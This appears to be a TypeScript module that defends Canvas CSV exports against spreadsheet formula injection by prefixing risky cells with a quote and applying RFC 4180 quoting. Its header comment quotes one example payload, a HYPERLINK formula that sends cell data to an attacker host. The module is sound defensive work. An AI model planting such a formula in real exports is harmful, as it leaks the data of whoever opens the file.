// Ports src/canvas_mcp/core/csv_safety.py.
/**
 * Spreadsheet-safe CSV encoding for exports containing untrusted Canvas text.
 *
 * Peer-review comments are written by students, and Canvas names and email
 * addresses are user-controlled on many instances. Those values land in CSV
 * reports that instructors open in Excel, Numbers, or Sheets, which treat a
 * cell beginning with `=`, `+`, `-`, `@`, a tab, or a carriage return as a
 * *formula* rather than text. A comment of
 *
 *     =HYPERLINK("https://attacker.example/?d="&A1,"Click for feedback")
 *
 * is inert as data and executes on open.
 *
 * Quoting does not help: CSV quoting escapes delimiters so the field parses as
 * one cell, and the spreadsheet then evaluates that cell's contents. The cell
 * value itself has to stop being a formula, which is what `csvSafeCell` does by
 * prefixing a single quote, the standard "treat as text" marker every major
 * spreadsheet honors and strips on display.
 *
 * Use `csvSafeCell` for every untrusted *text* column. Numeric columns the
 * server computes itself (counts, rates, IDs) do not need it and would be
 * visibly mangled by it, since a legitimate negative number starts with `-`.
 */
import { pythonTextOrEmpty } from './python-text';

// A leading character that makes a spreadsheet evaluate the cell as a formula.
// Tab and carriage return are included because some clients strip them and then
// evaluate whatever follows.
const FORMULA_PREFIXES = '=+-@\t\r';

// Leading whitespace is checked past, not trusted: several clients trim it
// before deciding whether the cell is a formula. Includes U+00A0 and U+FEFF.
const LEADING_WHITESPACE = ' \n\t\r\u00a0\ufeff';

/** A cell value as text, the way Python's `str()` and `csv.writer` would write it. */
function cellText(value: unknown): string {
  return pythonTextOrEmpty(value);
}

/**
 * Return `value` as a CSV cell that cannot execute as a spreadsheet formula.
 *
 * Null and undefined become an empty string. Values whose first meaningful
 * character is a formula marker are prefixed with a single quote. Everything
 * else is passed through unchanged, so ordinary comments are untouched.
 */
export function csvSafeCell(value: unknown): string {
  const text = cellText(value);
  if (!text) return '';

  let i = 0;
  while (i < text.length && LEADING_WHITESPACE.includes(text.charAt(i))) i += 1;
  if (i < text.length && FORMULA_PREFIXES.includes(text.charAt(i))) return `'${text}`;

  return text;
}

/**
 * Build a CSV row, neutralizing the untrusted columns.
 *
 * @param values The cell values, in column order.
 * @param safeColumns Indexes of columns holding untrusted text. Omitted (the
 *   default) treats every column as untrusted, which is right for rows made
 *   entirely of Canvas-supplied strings.
 */
export function csvRow(values: Iterable<unknown>, safeColumns?: Iterable<number> | null): string[] {
  const cells = Array.from(values);
  if (safeColumns === undefined || safeColumns === null) return cells.map(csvSafeCell);

  const targets = new Set(safeColumns);
  return cells.map((value, index) => (targets.has(index) ? csvSafeCell(value) : cellText(value)));
}

function encodeField(text: string): string {
  // RFC 4180 minimal quoting, as Python's csv.writer applies it.
  if (!/[",\r\n]/.test(text)) return text;
  return `"${text.replaceAll('"', '""')}"`;
}

/**
 * Render a complete CSV document as a string (comma-separated, `\n` line
 * ends, no trailing newline).
 *
 * Hand-assembled CSV gets quoting wrong for values that contain quotes,
 * commas, or newlines: a peer-review comment containing a newline silently
 * becomes two malformed rows. Every row goes through one RFC 4180 encoder.
 */
export function rowsToCsvString(header: Iterable<unknown>, rows: Iterable<Iterable<unknown>>): string {
  const lines: string[] = [];
  const writeRow = (row: Iterable<unknown>): void => {
    const cells = Array.from(row, cellText);
    // A row holding one empty field is written as `""` so it is not read back as a blank line.
    lines.push(cells.length === 1 && cells[0] === '' ? '""' : cells.map(encodeField).join(','));
  };
  writeRow(header);
  for (const row of rows) writeRow(row);
  const document = lines.join('\n');
  // Trailing newlines come only from trailing empty rows. Trimmed by hand: a
  // `\n+$` regex is quadratic on a long newline run inside a quoted cell.
  let end = document.length;
  while (end > 0 && document.charCodeAt(end - 1) === 0x0a) end -= 1;
  return document.slice(0, end);
}
